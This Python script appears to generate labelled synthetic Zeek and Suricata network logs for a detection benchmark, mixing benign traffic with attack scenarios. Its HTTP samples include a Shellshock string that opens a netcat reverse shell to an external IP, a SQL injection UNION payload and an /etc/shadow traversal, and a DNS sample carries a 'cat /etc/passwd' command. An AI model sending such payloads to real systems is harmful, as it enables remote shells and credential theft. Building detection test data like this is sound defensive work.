"""Script to generate an expanded, diverse, realistic corpus of network telemetry logs.

Produces high-fidelity synthetic logs matching authentic Zeek (conn, http, dns)
and Suricata EVE schemas for comprehensive benchmark evaluation (Weeks 11-13 milestone).
"""

import os
import json
import random
import time

random.seed(42)

OUTPUT_DIR = os.path.join(os.path.dirname(__file__), "expanded_logs")
os.makedirs(OUTPUT_DIR, exist_ok=True)

# -------------------------------------------------------------------------
# 1. ZEEK CONN LOGS (Normal traffic vs Scans, Brute Force, C2)
# -------------------------------------------------------------------------
def generate_zeek_conn_logs(n_benign=30, n_malicious=30):
    records = []
    base_ts = 1727390000.0

    # Benign connections
    internal_ips = [f"192.168.10.{i}" for i in range(10, 60)]
    benign_services = [
        ("142.250.190.46", 443, "ssl", "SF", 1200, 8500),
        ("140.82.121.4", 443, "ssl", "SF", 3400, 15400),
        ("20.82.210.3", 443, "ssl", "SF", 800, 2400),
        ("104.244.42.1", 443, "ssl", "SF", 2100, 12000),
        ("151.101.1.69", 80, "http", "SF", 450, 1850),
        ("192.168.10.1", 53, "dns", "SF", 72, 148),
        ("192.168.10.5", 22, "ssh", "SF", 4500, 6200),
    ]

    for i in range(n_benign):
        src_ip = random.choice(internal_ips)
        dst_ip, dst_port, service, state, sent_base, recv_base = random.choice(benign_services)
        sent = sent_base + random.randint(-100, 500)
        recv = recv_base + random.randint(-200, 1200)
        records.append({
            "ts": base_ts + i * 2.5,
            "uid": f"C_benign_{i+1:04d}",
            "id.orig_h": src_ip,
            "id.orig_p": random.randint(49152, 65535),
            "id.resp_h": dst_ip,
            "id.resp_p": dst_port,
            "proto": "tcp" if service != "dns" else "udp",
            "service": service,
            "duration": round(random.uniform(0.05, 4.5), 3),
            "orig_bytes": max(0, sent),
            "resp_bytes": max(0, recv),
            "conn_state": state,
            "history": "ShADadFf" if state == "SF" else "S",
            "_ground_truth": "benign",
            "_scenario": "routine_workstation_traffic"
        })

    # Malicious connections
    attacker_ips = [
        "185.220.101.5", "185.220.101.9", "45.33.32.156", "194.26.29.112",
        "198.51.100.23", "203.0.113.44", "103.251.167.20"
    ]
    attack_scenarios = [
        # SYN Port Scan
        {"ports": [21, 22, 23, 25, 80, 443, 8080, 8443, 3389], "state": "S0", "history": "S", "sent": 0, "recv": 0, "scenario": "syn_stealth_scan"},
        # SSH Brute Force
        {"ports": [22], "state": "SF", "history": "ShADadFf", "sent": 12000, "recv": 14000, "scenario": "ssh_credential_bruteforce"},
        # RDP Scan
        {"ports": [3389], "state": "REJ", "history": "Sr", "sent": 0, "recv": 0, "scenario": "rdp_exposure_scan"},
        # High-frequency C2 beacon
        {"ports": [4444, 8888, 9001], "state": "SF", "history": "ShADadFf", "sent": 256, "recv": 128, "scenario": "c2_reverse_shell_beacon"}
    ]

    for i in range(n_malicious):
        atk = random.choice(attack_scenarios)
        records.append({
            "ts": base_ts + 1000 + i * 1.8,
            "uid": f"C_mal_{i+1:04d}",
            "id.orig_h": random.choice(attacker_ips),
            "id.orig_p": random.randint(32000, 60000),
            "id.resp_h": "192.168.10.80",
            "id.resp_p": random.choice(atk["ports"]),
            "proto": "tcp",
            "service": "ssl" if 443 in atk["ports"] else ("ssh" if 22 in atk["ports"] else "-"),
            "duration": round(random.uniform(0.001, 1.2), 3),
            "orig_bytes": atk["sent"],
            "resp_bytes": atk["recv"],
            "conn_state": atk["state"],
            "history": atk["history"],
            "_ground_truth": "malicious",
            "_scenario": atk["scenario"]
        })

    with open(os.path.join(OUTPUT_DIR, "expanded_zeek_conn.json"), "w") as f:
        for r in records:
            f.write(json.dumps(r) + "\n")
    print(f"[+] Generated {len(records)} Zeek conn records ({n_benign} benign, {n_malicious} malicious).")


# -------------------------------------------------------------------------
# 2. ZEEK HTTP LOGS (Normal browsing vs Web Exploits)
# -------------------------------------------------------------------------
def generate_zeek_http_logs(n_benign=20, n_malicious=20):
    records = []
    base_ts = 1727390000.0

    benign_uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "curl/8.4.0",
        "python-requests/2.31.0"
    ]
    benign_uris = [
        ("/index.html", "example.com", 200),
        ("/api/v1/health", "internal.corp.local", 200),
        ("/static/css/app.min.css", "cdn.corp.local", 200),
        ("/login.php", "auth.corp.local", 200),
        ("/search?q=quarterly+financials", "intranet.corp.local", 200),
        ("/downloads/manual_v2.pdf", "docs.corp.local", 200),
    ]

    for i in range(n_benign):
        uri, host, status = random.choice(benign_uris)
        records.append({
            "ts": base_ts + i * 3.1,
            "uid": f"H_benign_{i+1:04d}",
            "id.orig_h": f"192.168.10.{random.randint(10, 50)}",
            "id.orig_p": random.randint(50000, 65000),
            "id.resp_h": "93.184.216.34",
            "id.resp_p": 80,
            "method": "GET",
            "host": host,
            "uri": uri,
            "user_agent": random.choice(benign_uas),
            "status_code": status,
            "status_msg": "OK",
            "_ground_truth": "benign",
            "_scenario": "routine_web_browsing"
        })

    malicious_attacks = [
        ("sqlmap/1.7.2#stable (https://sqlmap.org)", "/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20null,table_name%20FROM%20information_schema.tables--", "sql_injection"),
        ("Mozilla/5.0 (Nikto/2.5.0)", "/../../../etc/shadow", "path_traversal"),
        ("curl/7.81.0", "/cgi-bin/test.cgi?cmd=() { :;}; /bin/bash -c 'nc -e /bin/sh 185.220.101.5 4444'", "shellshock_rce"),
        ("Go-http-client/1.1", "/wp-login.php?action=exec&payload=whoami", "wordpress_admin_exploit"),
        ("DirBuster-1.0.0-RC1", "/admin/backup.zip", "sensitive_file_enumeration")
    ]

    for i in range(n_malicious):
        ua, uri, scenario = random.choice(malicious_attacks)
        records.append({
            "ts": base_ts + 2000 + i * 2.0,
            "uid": f"H_mal_{i+1:04d}",
            "id.orig_h": "45.33.32.156",
            "id.orig_p": random.randint(40000, 60000),
            "id.resp_h": "192.168.10.80",
            "id.resp_p": 80,
            "method": "GET",
            "host": "192.168.10.80",
            "uri": uri,
            "user_agent": ua,
            "status_code": 403 if "etc" in uri else 200,
            "status_msg": "Forbidden" if "etc" in uri else "OK",
            "_ground_truth": "malicious",
            "_scenario": scenario
        })

    with open(os.path.join(OUTPUT_DIR, "expanded_zeek_http.json"), "w") as f:
        for r in records:
            f.write(json.dumps(r) + "\n")
    print(f"[+] Generated {len(records)} Zeek HTTP records ({n_benign} benign, {n_malicious} malicious).")


# -------------------------------------------------------------------------
# 3. ZEEK DNS LOGS (Normal resolutions vs Tunneling / DGA)
# -------------------------------------------------------------------------
def generate_zeek_dns_logs(n_benign=20, n_malicious=20):
    records = []
    base_ts = 1727390000.0

    benign_queries = [
        ("api.github.com", "A", ["140.82.121.6"], "NOERROR"),
        ("updates.microsoft.com", "A", ["20.82.210.3"], "NOERROR"),
        ("login.microsoftonline.com", "A", ["20.190.159.2"], "NOERROR"),
        ("corp-mail.local", "MX", ["10 mail.corp-mail.local."], "NOERROR"),
        ("dns.google", "A", ["8.8.8.8", "8.8.4.4"], "NOERROR"),
        ("cdn.cloudflare.net", "CNAME", ["cloudflare.com."], "NOERROR")
    ]

    for i in range(n_benign):
        q, qtype, answers, rcode = random.choice(benign_queries)
        records.append({
            "ts": base_ts + i * 1.5,
            "id.orig_h": f"192.168.10.{random.randint(10, 50)}",
            "id.orig_p": random.randint(50000, 60000),
            "id.resp_h": "1.1.1.1",
            "id.resp_p": 53,
            "proto": "udp",
            "query": q,
            "qtype_name": qtype,
            "rcode_name": rcode,
            "answers": answers,
            "_ground_truth": "benign",
            "_scenario": "routine_dns_lookup"
        })

    malicious_dns = [
        ("a8f3b20c91.c2-exfiltration-domain.xyz", "TXT", ["cmd=whoami;cat /etc/passwd"], "NOERROR", "dns_tunnel_exfiltration"),
        ("beacon-30s.badactor-c2.ru", "A", ["185.220.101.5"], "NOERROR", "c2_command_beacon"),
        ("kj98sf7a6s5df87as.dga-botnet-family.top", "A", [], "NXDOMAIN", "dga_lookup_failure"),
        ("exfil-part01-token-eyJhbGci.attacker-data.org", "TXT", ["ACK"], "NOERROR", "staged_dns_exfil")
    ]

    for i in range(n_malicious):
        q, qtype, answers, rcode, scenario = random.choice(malicious_dns)
        records.append({
            "ts": base_ts + 3000 + i * 2.2,
            "id.orig_h": "192.168.10.99",
            "id.orig_p": random.randint(50000, 60000),
            "id.resp_h": "8.8.8.8",
            "id.resp_p": 53,
            "proto": "udp",
            "query": q,
            "qtype_name": qtype,
            "rcode_name": rcode,
            "answers": answers,
            "_ground_truth": "malicious",
            "_scenario": scenario
        })

    with open(os.path.join(OUTPUT_DIR, "expanded_zeek_dns.json"), "w") as f:
        for r in records:
            f.write(json.dumps(r) + "\n")
    print(f"[+] Generated {len(records)} Zeek DNS records ({n_benign} benign, {n_malicious} malicious).")


# -------------------------------------------------------------------------
# 4. SURICATA EVE ALERTS (Low Severity / Policy vs Exploit Alerts)
# -------------------------------------------------------------------------
def generate_suricata_eve_logs(n_benign=15, n_malicious=25):
    records = []
    base_iso = "2026-09-27T10:15:"

    benign_alerts = [
        ("ET POLICY Outbound HTTPS connection to Known Web Service", "Generic Protocol Command Decode", 3, "allowed"),
        ("ET INFO Observed DNS Query for NTP Pool", "Potentially Bad Traffic", 3, "allowed"),
        ("SURICATA STREAM 3way handshake with invalid ACK", "Generic Protocol Command Decode", 3, "allowed")
    ]

    for i in range(n_benign):
        sig, cat, sev, action = random.choice(benign_alerts)
        records.append({
            "timestamp": f"{base_iso}{i*3:02d}.123456+0000",
            "event_type": "alert",
            "src_ip": "192.168.10.15",
            "src_port": random.randint(40000, 60000),
            "dest_ip": "142.250.190.46",
            "dest_port": 443,
            "proto": "TCP",
            "alert": {
                "action": action,
                "gid": 1,
                "signature_id": 2001000 + i,
                "rev": 1,
                "signature": sig,
                "category": cat,
                "severity": sev
            },
            "_ground_truth": "benign",
            "_scenario": "routine_ids_policy_telemetry"
        })

    malicious_alerts = [
        ("ET ATTACK_RESPONSE SQL Injection Attempt (UNION SELECT detected)", "Web Application Attack", 1, "blocked", "sql_injection"),
        ("ET SCAN Potential SSH Brute Force Inbound", "Attempted Information Leak", 2, "allowed", "ssh_bruteforce"),
        ("ET MALWARE Suspected High-Entropy DNS Tunneling Payload Observed", "A Network Trojan was detected", 1, "blocked", "dns_tunnel"),
        ("ET EXPLOIT Apache Log4j RCE Attempt (CVE-2021-44228)", "Attempted Administrator Privilege Gain", 1, "blocked", "log4j_exploit"),
        ("ET WEB_SERVER Possible Directory Traversal Attempt (/../)", "Web Application Attack", 2, "blocked", "path_traversal")
    ]

    for i in range(n_malicious):
        sig, cat, sev, action, scenario = random.choice(malicious_alerts)
        records.append({
            "timestamp": f"{base_iso}{30 + (i%30):02d}.789123+0000",
            "event_type": "alert",
            "src_ip": "185.220.101.5",
            "src_port": random.randint(40000, 60000),
            "dest_ip": "192.168.10.80",
            "dest_port": 80 if "WEB" in sig or "SQL" in sig or "Log4j" in sig else 22,
            "proto": "TCP",
            "alert": {
                "action": action,
                "gid": 1,
                "signature_id": 2010000 + i,
                "rev": 3,
                "signature": sig,
                "category": cat,
                "severity": sev
            },
            "_ground_truth": "malicious",
            "_scenario": scenario
        })

    with open(os.path.join(OUTPUT_DIR, "expanded_suricata_eve.json"), "w") as f:
        for r in records:
            f.write(json.dumps(r) + "\n")
    print(f"[+] Generated {len(records)} Suricata EVE records ({n_benign} benign, {n_malicious} malicious).")


if __name__ == "__main__":
    generate_zeek_conn_logs(40, 40)
    generate_zeek_http_logs(25, 25)
    generate_zeek_dns_logs(25, 25)
    generate_suricata_eve_logs(20, 30)
    print("\n[SUCCESS] Expanded dataset successfully created in 'data/expanded_logs/'.")
